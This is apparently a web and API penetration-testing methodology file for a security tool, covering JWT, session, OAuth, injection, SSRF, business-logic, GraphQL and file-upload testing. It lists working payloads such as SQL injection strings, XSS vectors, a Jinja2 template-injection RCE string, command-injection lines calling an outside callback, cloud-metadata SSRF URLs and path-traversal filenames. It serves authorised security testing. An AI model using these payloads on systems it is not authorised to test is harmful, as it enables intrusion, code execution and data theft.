# Web/API Security Testing Methodology

Loaded when `app_type = "web"`. Reference: PortSwigger Web Security Academy, OWASP Testing Guide v4.

## Authentication Testing

### JWT attacks
1. Decode token: `python3 -c "import jwt; print(jwt.decode(TOKEN, options={'verify_signature': False}))"`
2. Test `alg: none`: Remove signature, set algorithm to "none"
3. Test `alg: HS256` with public key: If RS256 is expected, try signing with the public key as HMAC secret
4. Brute-force weak secrets: `python3 -c "import jwt; jwt.decode(TOKEN, 'secret', algorithms=['HS256'])"`
5. Test `kid` injection: `"kid": "../../dev/null"` with empty secret
6. Test `jku`/`x5u` header injection: Point to attacker-controlled JWK set
7. Check expiration enforcement: Replay expired tokens
8. Test claim manipulation: Change `sub`, `role`, `admin` fields

### Session management
1. Test session fixation: Set session cookie before auth, check if it persists after login
2. Test session invalidation: Logout and replay the session token
3. Check cookie flags: `Secure`, `HttpOnly`, `SameSite`, `Path`, `Domain`
4. Test concurrent sessions: Does creating a new session invalidate old ones?

### OAuth/SSO
1. Test redirect_uri manipulation: Open redirect via OAuth flow
2. Test state parameter: CSRF via OAuth without state validation
3. Test scope escalation: Request higher scopes than authorized
4. PKCE bypass: Skip code_verifier in token exchange
5. Token leakage: Check referrer headers after OAuth redirect

### Password reset
1. Test token predictability: Request multiple reset tokens, check for patterns
2. Test token reuse: Use a reset token twice
3. Test host header injection: Modify Host header in reset request to capture token
4. Rate limiting on reset endpoint

## Access Control / Authorization

### IDOR (Insecure Direct Object Reference)
1. Identify all endpoints that reference objects by ID
2. Create two accounts with different permissions
3. Try accessing Account A's resources with Account B's token
4. Test numeric IDs: increment/decrement
5. Test UUID prediction: If sequential UUIDs, try guessing
6. Test encoded IDs: Base64-decode, modify, re-encode
7. Test parameter pollution: `?id=1&id=2`
8. Test HTTP method override: Same endpoint, different HTTP methods

### Privilege escalation
1. Identify admin-only endpoints from JS files, API docs, or error messages
2. Access admin endpoints with low-privilege token
3. Test role parameter manipulation in profile/settings update
4. Test mass assignment: Add `role=admin` or `is_admin=true` to update requests
5. Test function-level access control: Can a user call admin API functions?

### Horizontal vs vertical
- Horizontal: Same role, different user's data
- Vertical: Lower role accessing higher role's functions
- Context-dependent: Same function, different context (e.g., editing someone else's draft)

## Injection

### SQL Injection
1. Test points: URL params, POST body, headers (X-Forwarded-For, Referer), cookies
2. Detection payloads: `'`, `"`, `\`, `' OR '1'='1`, `' OR 1=1--`, `'; WAITFOR DELAY '0:0:5'--`
3. Confirm with time-based: `' AND SLEEP(5)--` (MySQL), `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `' AND pg_sleep(5)--` (PostgreSQL)
4. If confirmed, use `sqlmap`: `sqlmap -u "URL" --data="param=value" --level=3 --risk=2 --batch`
5. Test second-order: Inject in registration, trigger in profile view
6. Test via JSON: `{"id": "1 OR 1=1"}`

### Cross-Site Scripting (XSS)
1. Map all reflection points: Where does user input appear in responses?
2. Test context: HTML body, attribute, JavaScript, URL, CSS
3. Basic payloads: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`, `javascript:alert(1)`
4. Filter bypass: `<ScRiPt>`, `<img/src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`
5. Use `dalfox` for automated scanning: `dalfox url "TARGET" --blind YOUR_CALLBACK`
6. For stored XSS: Inject via one endpoint, check all pages where the value renders
7. DOM-based: Check JS source/sinks in client-side code

### Server-Side Template Injection (SSTI)
1. Detect: `{{7*7}}` → `49`, `${7*7}` → `49`, `<%= 7*7 %>` → `49`
2. Identify engine: `{{7*'7'}}` → `7777777` (Jinja2), `49` (Twig)
3. Jinja2 RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
4. Test in: email templates, PDF generation, error messages, profile fields

### Command Injection
1. Test points: Any parameter that might interact with the OS (filenames, IPs, URLs)
2. Payloads: `; id`, `| id`, `$(id)`, `` `id` ``, `%0aid`
3. Blind detection: `; sleep 5`, `| ping -c 5 127.0.0.1`
4. Out-of-band: `; curl YOUR_CALLBACK`, `; nslookup YOUR_DOMAIN`

### SSRF (Server-Side Request Forgery)
1. Identify endpoints that accept URLs (webhooks, image upload, link preview, PDF gen)
2. Test internal access: `http://127.0.0.1`, `http://localhost`, `http://[::1]`
3. Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP)
4. Bypass filters: Use decimal IP (`2130706433`), hex IP (`0x7f000001`), DNS rebinding, URL encoding
5. Protocol smuggling: `gopher://`, `file:///`, `dict://`
6. Partial SSRF: If only host is controllable, try `attacker.com#@allowed.com`

## Business Logic

### Race conditions
1. Identify state-changing operations (coupon apply, transfer, vote)
2. Send concurrent requests: `python3` script with `asyncio` + `httpx`
3. Test: Can you apply a coupon twice? Transfer more than balance? Double-vote?
4. Use single-packet attack technique (HTTP/2) for precise timing

### Price/quantity manipulation
1. Intercept checkout flow, modify price/quantity/discount parameters
2. Test negative quantities
3. Test currency manipulation
4. Test applying multiple discount codes

### Workflow bypass
1. Map multi-step processes (registration, checkout, approval)
2. Skip intermediate steps by jumping directly to final endpoint
3. Modify state parameters in intermediate requests
4. Test: Can you approve your own request?

## API-Specific Testing

### GraphQL
1. Introspection: `{__schema{types{name,fields{name}}}}`
2. If disabled: field suggestion enumeration, `__type` queries
3. Batching attacks: Send array of mutations in one request
4. Nested query DoS: `{user{friends{friends{friends{name}}}}}`
5. Alias-based rate limit bypass: Use aliases to send many queries in one request

### REST API
1. Test all HTTP methods per endpoint (GET, POST, PUT, PATCH, DELETE, OPTIONS)
2. Parameter pollution: duplicate parameters, array injection
3. Content-type switching: JSON ↔ XML ↔ form-urlencoded
4. Mass assignment: Add unexpected fields to update requests
5. API versioning bypass: Try `/api/v1/` if only `/api/v2/` is documented

## Security Headers Audit
Check for missing or misconfigured:
- `Strict-Transport-Security` (HSTS)
- `Content-Security-Policy` (CSP)
- `X-Frame-Options`
- `X-Content-Type-Options`
- `Referrer-Policy`
- `Permissions-Policy`
- CORS: `Access-Control-Allow-Origin` — test with `Origin: https://evil.com`

## File Upload Testing
1. Extension bypass: `.php.jpg`, `.php%00.jpg`, `.pHp`, `.php5`
2. Content-type bypass: Upload PHP with `Content-Type: image/jpeg`
3. Magic bytes: Add GIF89a header to PHP file
4. SVG XSS: Upload SVG containing `<script>` tags
5. Path traversal in filename: `../../../etc/passwd`
6. Polyglot files: Files valid as both image and executable
